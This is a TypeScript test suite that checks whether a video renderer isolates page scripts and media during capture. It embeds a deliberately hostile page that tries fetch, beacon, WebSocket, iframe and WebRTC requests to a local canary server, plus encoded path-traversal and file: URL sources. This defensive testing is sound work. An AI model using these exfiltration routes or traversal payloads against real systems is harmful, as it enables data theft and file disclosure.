import { execFileSync } from "node:child_process";
import { createSocket } from "node:dgram";
import { copyFile, mkdir, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import type { AddressInfo } from "node:net";
import { networkInterfaces } from "node:os";
import { dirname, join } from "node:path";
import { pathToFileURL } from "node:url";
import { createLogger } from "@studix/shared";
import { afterAll, describe, expect, it } from "vitest";
import { renderWithProducer } from "../src/hyperframes/producer-render.ts";
import { renderToolchain, tempDir } from "./render-test-helpers.ts";

const toolchain = renderToolchain();
const require = createRequire(import.meta.url);
const cleanups: (() => Promise<void> | void)[] = [];
afterAll(async () => {
  for (const cleanup of cleanups.reverse()) await cleanup();
});

/** An address of this host that is not loopback: a request to it would leave the browser's own machine. */
function externalAddress(): string | undefined {
  for (const list of Object.values(networkInterfaces())) {
    const found = list?.find((a) => a.family === "IPv4" && !a.internal);
    if (found) return found.address;
  }
  return undefined;
}

const host = externalAddress();

/** The engine instance the producer imports; its download transport can be replaced in tests. */
async function loadEngine(): Promise<{
  _setDownloadFetchForTests: (replacement: typeof fetch | undefined) => void;
}> {
  const enginePackage = createRequire(import.meta.resolve("@hyperframes/producer")).resolve(
    "@hyperframes/engine/package.json",
  );
  return import(pathToFileURL(join(dirname(enginePackage), "dist", "index.js")).href);
}

/** Mean RGB of one frame at `seconds`, as 0..255 integers. */
function frameColor(file: string, seconds: number): [number, number, number] {
  const raw = execFileSync(
    "ffmpeg",
    [
      "-v",
      "error",
      "-ss",
      String(seconds),
      "-i",
      file,
      "-frames:v",
      "1",
      "-vf",
      "scale=1:1",
      "-f",
      "rawvideo",
      "-pix_fmt",
      "rgb24",
      "-",
    ],
    { maxBuffer: 1024 },
  );
  return [raw[0]!, raw[1]!, raw[2]!];
}

// The page script stands for any JavaScript that reaches a capture: it tries every route out of the render.
function videoTag(id: string, src: string): string {
  return `    <video id="${id}" data-start="0" data-duration="1" data-track-index="2" src="${src}" muted playsinline style="position:absolute;inset:0;width:160px;height:90px"></video>`;
}

function hostileIndexHtml(
  canaries: string[],
  stunPort: number,
  secretSrcs: string[],
  projectSrcs: string[],
  staticMarkup: string,
): string {
  const media = secretSrcs.map((src, i) => videoTag(`leak-${i}`, src)).join("\n");
  const staticMedia = projectSrcs.map((src, i) => videoTag(`clip-${i}`, src)).join("\n");
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <script src="assets/vendor/gsap.min.js"></script>
    <style>html, body, #root { margin: 0; width: 160px; height: 90px; overflow: hidden; background: #000; }</style>
  </head>
  <body>
    <div id="root" data-composition-id="main" data-start="0" data-duration="1" data-width="160" data-height="90">
${staticMedia}
${staticMarkup}
    </div>
    <script>
      (function () {
        ${JSON.stringify(canaries)}.forEach(function (canary) {
          try { fetch(canary + "/fetch", { mode: "no-cors" }).catch(function () {}); } catch (e) {}
          try { fetch(canary + "/post", { method: "POST", mode: "no-cors", body: "x" }).catch(function () {}); } catch (e) {}
          try { navigator.sendBeacon(canary + "/beacon", "x"); } catch (e) {}
          try { new Image().src = canary + "/image"; } catch (e) {}
          try { new WebSocket(canary.replace("http", "ws") + "/ws"); } catch (e) {}
          try { window.open(canary + "/popup"); } catch (e) {}
          try {
            var frame = document.createElement("iframe");
            frame.src = canary + "/iframe";
            document.body.appendChild(frame);
          } catch (e) {}
        });
        try {
          var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:${host}:${stunPort}" }] });
          pc.createDataChannel("x");
          pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
        } catch (e) {}
        var root = document.getElementById("root");
        root.insertAdjacentHTML("beforeend", ${JSON.stringify(media)});
        var tl = gsap.timeline({ paused: true });
        tl.set({}, {}, 1);
        window.__timelines = window.__timelines || {};
        window.__timelines.main = tl;
      })();
    </script>
  </body>
</html>
`;
}

/**
 * A started canary: an HTTP/WebSocket server and a UDP (STUN) socket. `url` is a non-loopback address;
 * `loopbackUrls` reach the same server through `localhost` and `127.0.0.1`, other loopback ports than the
 * producer's file server, which the page must not reach either.
 */
async function startCanary(address: string) {
  const hits: string[] = [];
  const http = createServer((req, res) => {
    hits.push(`http ${req.url}`);
    res.end("leak");
  });
  http.on("upgrade", (req, socket) => {
    hits.push(`ws ${req.url}`);
    socket.destroy();
  });
  await new Promise<void>((resolve) => http.listen(0, "0.0.0.0", resolve));
  cleanups.push(() => new Promise<void>((resolve) => http.close(() => resolve())));
  const udp = createSocket("udp4");
  udp.on("message", () => hits.push("udp stun"));
  await new Promise<void>((resolve) => udp.bind(0, "0.0.0.0", resolve));
  cleanups.push(() => {
    udp.close();
  });
  return {
    hits,
    url: `http://${address}:${(http.address() as AddressInfo).port}`,
    loopbackUrls: [
      `http://localhost:${(http.address() as AddressInfo).port}`,
      `http://127.0.0.1:${(http.address() as AddressInfo).port}`,
    ],
    stunPort: (udp.address() as AddressInfo).port,
  };
}

const skipReason = !toolchain.ok ? toolchain.reason : host ? "" : "no non-loopback IPv4 address";

describe.skipIf(skipReason !== "")(
  `HyperFrames capture isolation${skipReason ? ` (skipped: ${skipReason})` : ""}`,
  () => {
    async function capture(
      secretSrcs: (secret: string, canaryUrl: string) => string[],
      projectSrcs: string[] = [],
      staticMarkup = "",
    ) {
      const canary = await startCanary(host!);
      const { dir, cleanup } = await tempDir("capture-isolation");
      cleanups.push(cleanup);
      // A red clip outside the project: the render must not show it.
      const secret = join(dir, "secret", "secret.mp4");
      await mkdir(join(dir, "secret"), { recursive: true });
      execFileSync("ffmpeg", [
        "-v",
        "error",
        "-f",
        "lavfi",
        "-i",
        "color=c=red:s=160x90:d=1:r=12",
        "-pix_fmt",
        "yuv420p",
        secret,
      ]);
      execFileSync("ffmpeg", ["-v", "error", "-i", secret, "-frames:v", "1", join(dir, "secret", "red.png")]);
      execFileSync("ffmpeg", ["-v", "error", "-i", secret, "-frames:v", "3", join(dir, "secret", "red.gif")]);
      const projectDir = join(dir, "a", "b", "project");
      await mkdir(join(projectDir, "assets", "vendor"), { recursive: true });
      await copyFile(
        require.resolve("gsap/dist/gsap.min.js"),
        join(projectDir, "assets", "vendor", "gsap.min.js"),
      );
      await mkdir(join(projectDir, "assets", "media"), { recursive: true });
      await copyFile(secret, join(projectDir, "assets", "media", "red.mp4"));
      await writeFile(
        join(projectDir, "index.html"),
        hostileIndexHtml(
          [canary.url, ...canary.loopbackUrls],
          canary.stunPort,
          secretSrcs(secret, canary.url),
          projectSrcs,
          staticMarkup,
        ),
      );
      const outputPath = join(dir, "out.mp4");
      await renderWithProducer({
        projectDir,
        outputPath,
        fps: 12,
        quality: "draft",
        crf: 30,
        workers: 1,
        logger: createLogger({ component: "capture-isolation-test" }, { level: "error" }),
        onProgress: () => {},
      });
      // Give late browser requests (beacons, ICE gathering) a moment to arrive.
      await new Promise((resolve) => setTimeout(resolve, 500));
      return { hits: canary.hits, outputPath };
    }

    it("sends no request from page scripts off the machine or to other loopback ports", async () => {
      const { hits, outputPath } = await capture(() => []);
      expect(hits).toEqual([]);
      expect(frameColor(outputPath, 0.5)).toEqual([0, 0, 0]);
    });

    // Positive control: the same clip inside the project reaches the frame. The producer re-discovers it from
    // the DOM, so it passes the same guard; a black frame below means the guard dropped a source.
    it("still renders project media that the guard checks", async () => {
      const { hits, outputPath } = await capture(() => [], ["assets/media/red.mp4"]);
      const [r, g, b] = frameColor(outputPath, 0.5);
      expect(r).toBeGreaterThan(200);
      expect(g + b).toBeLessThan(40);
      expect(hits).toEqual([]);
    });

    it.each([
      ["an encoded ../ path", () => "..%2f..%2f..%2fsecret%2fsecret.mp4"],
      ["an encoded ..\\ path", () => "..%5c..%5c..%5csecret%5csecret.mp4"],
      [
        "a double-encoded ../ path",
        () => "%252e%252e%252f%252e%252e%252f%252e%252e%252fsecret%252fsecret.mp4",
      ],
      ["a file: URL", (secret: string) => `file://${secret}`],
      ["an http: URL", (_: string, canaryUrl: string) => `${canaryUrl}/media.mp4`],
    ])("keeps runtime media with %s out of the render", async (_name, src) => {
      const { hits, outputPath } = await capture((secret, canaryUrl) => [src(secret, canaryUrl)]);
      expect(frameColor(outputPath, 0.5)).toEqual([0, 0, 0]);
      expect(hits).toEqual([]);
    });

    // The compiler reads the page as a string before any browser starts: user text that looks like CSS
    // (`background:url(https://…)` in a caption) must not make the worker download it, a font family must not
    // make it ask Google Fonts (the request carries the page's characters), and markup that points outside the
    // project must not copy or convert a host file (PNG, animated GIF) into the render.
    it("keeps the compiler off the network and the host filesystem", async () => {
      const engine = await loadEngine();
      const requests: string[] = [];
      const recordingFetch = (async (input: string | URL | Request) => {
        requests.push(String(input instanceof Request ? input.url : input));
        return new Response("x", { status: 200, headers: { "content-type": "image/png" } });
      }) as typeof fetch;
      // The engine downloader has its own transport; font embedding uses the global fetch.
      engine._setDownloadFetchForTests(recordingFetch);
      const globalFetch = globalThis.fetch;
      globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
        const url = String(input instanceof Request ? input.url : input);
        if (url.startsWith("http://localhost:")) return globalFetch(input, init);
        return recordingFetch(input, init);
      }) as typeof fetch;
      try {
        const box = "position:absolute;inset:0;width:160px;height:90px";
        const { hits, outputPath } = await capture(
          () => [],
          [],
          [
            `    <img src="../../../secret/red.png" alt="" style="${box}" />`,
            `    <img src="../../../secret/red.gif" alt="" style="${box}" />`,
            `    <div style="${box};background-image:url(../../../secret/red.png);background-size:cover"></div>`,
            `    <p style="color:#000;font-family:Roboto">background:url(https://example.com/bg.png) background-image: url(https://example.com/x.png)</p>`,
          ].join("\n"),
        );
        // The host file is red; a missing image may leave a faint grey placeholder.
        const [r, g, b] = frameColor(outputPath, 0.5);
        expect(r).toBeLessThan(20);
        expect(Math.abs(r - g) + Math.abs(r - b)).toBeLessThan(6);
        expect(hits).toEqual([]);
      } finally {
        engine._setDownloadFetchForTests(undefined);
        globalThis.fetch = globalFetch;
      }
      expect(requests).toEqual([]);
    });
  },
);
